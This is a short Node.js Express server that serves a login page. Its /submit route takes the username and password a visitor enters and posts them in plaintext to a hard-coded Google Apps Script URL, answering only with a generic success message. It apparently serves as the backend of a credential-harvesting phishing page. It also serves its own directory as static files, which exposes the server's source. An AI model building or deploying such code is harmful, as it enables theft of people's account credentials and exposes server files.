const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from the root directory
app.use(express.static(__dirname)); // Change this line

// Endpoint to handle form submission
app.post('/submit', async (req, res) => {
    const { username, password } = req.body;

    const url = 'https://script.google.com/macros/s/AKfycbwnQ-cwEYHNLDPSdHq-eznQ2TP9Dc9HPk0gV-y_1G7bHwLFQR6NXF5k_NXaNSbxDYp4/exec';

    try {
        const response = await axios.post(url, { username, password });
        res.send("Data submitted successfully.");
    } catch (error) {
        console.error("Error submitting data:", error);
        res.status(500).send("Error submitting data.");
    }
});

// Serve HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html')); // Update this line
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
